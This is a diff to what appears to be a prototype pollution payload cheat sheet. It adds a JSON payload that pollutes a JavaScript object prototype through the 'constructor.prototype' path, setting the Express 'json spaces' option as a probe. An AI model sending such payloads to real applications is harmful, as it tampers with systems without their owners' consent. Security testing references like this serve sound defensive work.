@@ -99,6 +99,19 @@ Asynchronous payload for NodeJS.
 }
 ```
 
+Polluting the prototype via the `constructor` property instead.
+
+```js
+{
+    "constructor": {
+        "prototype": {
+            "foo": "bar",
+            "json spaces": 10
+        }
+    }
+}
+```
+
 
 ### Prototype Pollution in URL
 
